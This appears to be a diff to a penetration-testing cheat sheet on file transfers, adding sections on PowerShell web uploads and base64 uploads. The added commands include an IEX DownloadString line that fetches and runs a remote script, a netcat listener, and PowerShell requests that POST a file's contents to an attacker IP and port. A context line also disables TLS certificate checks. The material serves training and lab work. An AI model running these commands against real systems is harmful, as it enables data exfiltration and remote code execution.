@@ -11,6 +11,8 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   <details>  
     <summary><strong>📥 Downloads</strong></summary>
       <details>
+        <summary><strong>PowerShell Downloads</strong></summary>  
+        <details> 
         <summary><strong>PowerShell DownloadFile Method</strong></summary>
           Sync  
           ```powershell
@@ -54,7 +56,7 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
   # Command to download the file
   ```
-
+  </details>
   </details>
 
   <details>
@@ -129,7 +131,8 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   </details>
   <details>  
     <summary><strong>📥 Uploads</strong></summary>  
-    
+    <details>  
+  <summary><strong>PowerShell Uploads</strong></summary>  
   <details>  
   <summary><strong>PowerShell Base64 Encode & Decode</strong></summary>  
     
@@ -145,6 +148,39 @@ We copy this content and paste it into our attack host, use the base64 command t
   echo <BASE64 STRING> | base64 -d > <FILE>
   md5sum <FILE>
   ```
+  </details>
+  <details>  
+  <summary><strong>PowerShell Web Uploads</strong></summary>  
+    
+  1. Installing a Configured WebServer with Upload in Linux
+  ```bash
+  pip3 install uploadserver
+  python3 -m uploadserver
+  ```
+  2. PowerShell Script to Upload a File to Python Upload Server
+  ```powershell
+  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
+  ```
+
+  </details>
+  <details>  
+  <summary><strong>PowerShell Base64 Web Upload</strong></summary>  
+    
+  1. We use Netcat to listen in on a port we specify and send the file as a POST request.
+  ```bash
+  nc -lvnp <PORT>
+  ```
+  2. PowerShell Script to Upload a File to Python Upload Server
+  ```powershell
+  $b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE PATH>' -Encoding Byte))
+  Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64
+  ```
+  3. We copy the output and use the base64 decode function to convert the base64 string into a file.
+  ```bash
+  echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
+  ```
+  </details>
   </details>
   </details>
 </details>
